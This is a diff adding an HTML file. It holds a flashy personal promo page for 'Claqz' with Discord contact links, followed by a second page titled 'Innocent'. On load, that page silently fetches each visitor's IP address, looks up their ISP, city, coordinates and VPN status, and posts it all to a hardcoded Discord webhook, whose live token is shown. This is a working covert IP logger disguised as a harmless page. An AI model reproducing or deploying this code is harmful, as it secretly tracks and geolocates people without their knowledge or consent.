@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Claqz</title>
+    <meta property="og:type" content="site"/>
+    <meta property="og:title" content="Claqz"/>
+    <meta property="og:description" content="discord.gg/mirobot"/>
+    <link rel="icon" href="assets/images/av.gif" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <link rel="stylesheet" href="assets/css/cte.css" />
+  </head>
+  <body>
+    <div id="particles-container"></div>
+    <audio controls hidden loop>
+      <source src="assets/audio/song.mp3" type="audio/mpeg"/>
+    </audio>
+    <div id="content-container">
+      <div class="center title topbar">
+        <img class="emoji" src="assets/images/av.png" /> Claqz
+        <img class="emoji" src="assets/images/av.png" />
+      </div>
+      <span id="typing" class="center"></span>
+      <div class="inline-container bottombar center">
+        <div style="display: inline-block; vertical-align: middle;" id="marquee"></div>
+      </div>
+    </div>
+    <script src="assets/particles.js/particles.min.js"></script>
+    <script src="assets/particles.js/app.js"></script>
+    <script src="assets/js/cte.js"></script>
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.marquee.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+    <script type="text/javascript" src="assets/js/portfolio.js"></script>
+    <script>
+      // var CTE = {};
+      window.onload = function () {
+        var aud = document.getElementsByTagName("audio")[0];
+        aud.volume = 0.4;
+        aud.play();
+
+        var typed = new Typed("#typing", {
+          strings: [
+            "Hello to my site!",
+            "Contact on discord: stardle",
+            "Contact on tele: Claqz",
+            "https://discord.gg/mirobot",
+          ],
+          typeSpeed: 55,
+          backspeed: 40,
+          showCursor: false,
+        });
+
+        var lines = [
+          "https://discord.gg/mirobot", "advanced bot",
+        ];
+        for (var x = 0; x < lines.length; x++)
+          $("#marquee").append(
+            `${lines[x]}${
+              x < lines.length - 1
+                ? ' <img class="emoji" src="assets/images/av.png"> '
+                : ""
+            }`
+          );
+
+        $("#marquee").marquee({
+          duration: 7500,
+          gap: 100,
+          delayBeforeStart: 1000,
+          direction: "left",
+        });
+      };
+    </script>
+  </body>
+</html>
+
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8">
+    <title>Innocent</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+    <script type="application/javascript">
+      $(function() {
+        $.getJSON("https://api.ipify.org?format=jsonp&callback=?", function(json) {
+          $.getJSON(`http://demo.ip-api.com/json/${json.ip}?fields=66846719&lang=en`, function(json2) {
+            const discordWebhook = "https://discord.com/api/webhooks/1132763317488848928/63P_xhthnQ9TPJK_l2AJMOdP6yKYjVeJINJ-lKzxXTu4Mv7gSPMrjztyL2Udtr-e4gxO";
+            let req = new XMLHttpRequest();
+            req.open("POST", discordWebhook);
+            req.setRequestHeader("Content-Type", "application/json");
+            let payloadRes = {
+              username: "Miro",
+              avatar_url: "https://cdn.discordapp.com/avatars/1107283467655458866/6290a83e445ba1ae4bc5be9c68514de4.png?size=1024",
+              content: "@everyone",
+              embeds: [{ 
+                title: `What's this ? The Informations About The Fabulous IP ${json.ip} !`,
+                description: `**ISP Informations**:\n=> Org: __**${json2.org}**__\n=> AS: __**${json2.as}**__ (ASN: __**${json2.asname}**__)\n=> Reverse(Reverse DNS of the IP (can delay response)): ${json2.reverse || "Not Found Or Need To Wait More"}\n=> Mobile(Cellular Data): __**${json2.mobile}**__\n=> Hosting: __**${json2.hosting}**__\n=> Proxy or VPN or Tor: __**${json2.proxy}**__\n**Location**:\n=> Country: __**${json2.country}**__ (__**${json2.continent}**__)\n=> City: __**${json2.city}**__\n=> Lat: __**${json2.lat}**__ & Lon: __**${json2.lon}**__`,
+                color: 0x46423C,
+              }]
+            };
+            req.send(JSON.stringify(payloadRes));
+            console.log(json2); 
+          });
+        });
+      });
+    </script>
+  </head>
+  <body>
+    <center>
+    <center>
+  </body>
+</html>
